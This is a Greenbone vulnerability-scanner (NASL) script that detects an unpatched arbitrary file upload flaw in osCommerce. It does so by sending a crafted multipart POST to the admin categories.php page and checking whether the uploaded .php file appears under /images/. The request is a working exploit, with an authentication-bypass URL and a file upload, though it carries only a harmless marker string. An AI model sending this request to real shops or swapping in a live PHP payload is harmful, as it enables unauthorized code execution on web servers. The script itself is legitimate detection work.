# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:oscommerce:oscommerce";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100913");
  script_version("2022-04-12T08:46:17+0000");
  script_tag(name:"last_modification", value:"2022-04-12 08:46:17 +0000 (Tue, 12 Apr 2022)");
  script_tag(name:"creation_date", value:"2010-11-22 15:38:55 +0100 (Mon, 22 Nov 2010)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("osCommerce 'categories.php' Arbitrary File Upload Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oscommerce_http_detect.nasl");
  script_mandatory_keys("oscommerce/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"osCommerce is prone to a vulnerability that lets attackers upload
  arbitrary files.");

  script_tag(name:"insight", value:"The issue occurs because the application fails to
  adequately sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to upload arbitrary code
  and run it in the context of the webserver process. This may facilitate unauthorized access or privilege
  escalation. Other attacks are also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44995");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

host = http_host_name( port:port );

vt_strings = get_vt_strings();

file = vt_strings["default_rand"] + ".php";

len = 348 + strlen( file );
url =  dir + "/admin/categories.php/login.php?cPath=&action=new_product_preview";

req = string(
          "POST ", url, " HTTP/1.1\r\n",
          "Host: ", host, "\r\n",
          "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
          "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n",
          "Accept-Encoding: gzip,deflate\r\n",
          "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
          "Connection: close\r\n",
          "Cookie: osCAdminID=39dcb776097440be7f8c32ffde752a74; LastVisit=1285316401\r\n",
          "Content-Type: multipart/form-data; boundary=---------------------------6540612847563306631121268491\r\n",
          "Content-Length: ",len,"\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="products_image"; filename="',file,'"',"\r\n",
          "Content-Type: application/x-bzip\r\n",
          "\r\n",
          vt_strings["default"],"\r\n",
          "\r\n",
          "-----------------------------6540612847563306631121268491\r\n",
          'Content-Disposition: form-data; name="submit"',"\r\n",
          "\r\n",
          " Save ","\r\n",
          "-----------------------------6540612847563306631121268491--\r\n","\r\n");
recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

url = dir + "/images/" + file;
if( http_vuln_check( port:port, url:url, pattern:vt_strings["default"] ) ) {
  report = string(
        "Note :\n\n",
        "It was possible to upload and execute a file on the remote webserver.\n",
        "The file is placed in directory: ", '"', dir, '/images/"', "\n",
        "and is named: ", '"', file, '"', "\n",
        "You should delete this file as soon as possible!\n" );
  security_message( port:port,data:report );
  exit( 0 );
}

exit( 99 );
